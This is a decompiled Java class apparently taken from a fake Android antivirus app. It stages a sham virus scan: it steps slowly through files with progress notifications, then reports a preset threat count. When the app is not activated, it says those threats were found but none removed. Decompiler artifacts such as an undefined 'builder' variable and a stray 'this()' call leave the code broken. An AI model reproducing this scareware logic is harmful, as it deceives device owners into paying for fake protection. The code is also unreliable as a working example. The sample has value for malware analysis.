package com.worker.androiddefender2;

import android.app.Notification;
import android.app.NotificationManager;
import android.content.Context;
import android.os.Environment;
import android.support.v4.app.NotificationCompat;
import android.widget.Toast;
import com.example.androiddefender2.DefenderApplication;
import java.io.File;
import system.AppSingleton;

public class PreparerWirusesSkaner {
  private boolean PauseScan = false;
  
  private boolean ScanApp;
  
  private boolean ScanSD;
  
  public Context cnt_n = null;
  
  Notification notification;
  
  public void startScanNotif(Context paramContext) {
    this.cnt_n = paramContext;
    Context context = this.cnt_n;
    DefenderApplication.getInstance();
    if (context.getSharedPreferences(DefenderApplication.APP_PREF, 0).getBoolean("chkStartWhenStart", false)) {
      DefenderApplication.getInstance();
      if (!DefenderApplication.isCurAutoScan) {
        final NotificationManager notificationManager = (NotificationManager)this.cnt_n.getSystemService("notification");
        final NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(this.cnt_n);
        builder.setContentTitle(paramContext.getResources().getString(2131099733)).setContentText(paramContext.getResources().getString(2131099734)).setSmallIcon(2130837542);
        (new Thread(new Runnable() {
              private int count_files = 0;
              
              private String file_name;
              
              private int virus_count_rand = 0;
              
              public int prepareFilesCount(File param1File) {
                try {
                  if (!(DefenderApplication.getInstance()).skaner_worker) {
                    if (param1File == null)
                      return 0; 
                    int i = 0;
                    File[] arrayOfFile = param1File.listFiles();
                    int j = arrayOfFile.length;
                    byte b = 0;
                    while (true) {
                      int k = i;
                      if (b < j) {
                        File file = arrayOfFile[b];
                        k = i;
                        if (!(DefenderApplication.getInstance()).skaner_worker) {
                          k = i;
                          if (file.canRead())
                            if (file.isDirectory()) {
                              k = i;
                              if (!file.getAbsolutePath().endsWith(".android_secure")) {
                                if (file.getAbsolutePath().endsWith("DCIM")) {
                                  k = i;
                                } else {
                                  k = i + prepareFilesCount(file);
                                } 
                              } else {
                                return k;
                              } 
                            } else {
                              k = i;
                              if (!file.getAbsolutePath().endsWith(".sbf")) {
                                this.count_files++;
                                this.file_name = file.getName().toString();
                                NotificationCompat.Builder builder = mBuilder;
                                StringBuilder stringBuilder = new StringBuilder();
                                this();
                                builder.setContentText(stringBuilder.append(PreparerWirusesSkaner.this.cnt_n.getResources().getString(2131099735)).append(" ").append(this.count_files).append(" (").append(this.file_name).append(")").toString()).setProgress(100, this.count_files, true);
                                notificationManager.notify(0, mBuilder.build());
                                try {
                                  Thread.sleep(100L);
                                  k = i;
                                } catch (InterruptedException interruptedException) {
                                  k = i;
                                } 
                              } 
                            }  
                        } 
                        b++;
                        i = k;
                        continue;
                      } 
                      return k;
                    } 
                  } 
                } catch (Exception exception) {
                  Toast.makeText(DefenderApplication.getInstance().getApplicationContext(), exception.toString(), 0).show();
                } 
                return 0;
              }
              
              public void run() {
                if (!(DefenderApplication.getInstance()).skaner_worker) {
                  DefenderApplication.getInstance();
                  DefenderApplication.isCurAutoScan = true;
                  this.count_files = prepareFilesCount(Environment.getRootDirectory());
                  mBuilder.setContentText("Scan complete").setProgress(0, 0, false);
                  notificationManager.notify(0, mBuilder.build());
                  this.virus_count_rand = (DefenderApplication.getInstance()).countViruses;
                  SystemFunctions systemFunctions = new SystemFunctions();
                  if (!(AppSingleton.getInstance()).activaten) {
                    systemFunctions.generateNotification(DefenderApplication.getInstance().getApplicationContext(), DefenderApplication.getInstance().getString(2131099648), String.format(PreparerWirusesSkaner.this.cnt_n.getResources().getString(2131099737), new Object[] { Integer.valueOf(this.virus_count_rand) }) + " " + String.format(PreparerWirusesSkaner.this.cnt_n.getResources().getString(2131099738), new Object[] { Integer.valueOf(0) }));
                  } else if ((DefenderApplication.getInstance()).indexesVr.size() > 0) {
                    systemFunctions.generateNotification(DefenderApplication.getInstance().getApplicationContext(), DefenderApplication.getInstance().getString(2131099648), String.format(PreparerWirusesSkaner.this.cnt_n.getResources().getString(2131099737), new Object[] { Integer.valueOf(this.virus_count_rand) }) + " " + String.format(PreparerWirusesSkaner.this.cnt_n.getResources().getString(2131099738), new Object[] { Integer.valueOf(this.virus_count_rand) }));
                  } else {
                    systemFunctions.generateNotification(DefenderApplication.getInstance().getApplicationContext(), DefenderApplication.getInstance().getString(2131099648), PreparerWirusesSkaner.this.cnt_n.getResources().getString(2131099736));
                  } 
                  DefenderApplication.getInstance();
                  DefenderApplication.isCurAutoScan = false;
                } 
              }
            })).start();
      } 
    } 
  }
}


/* Location:              /home/fahim/Desktop/fake_av_reader-dex2jar.jar!/com/worker/androiddefender2/PreparerWirusesSkaner.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */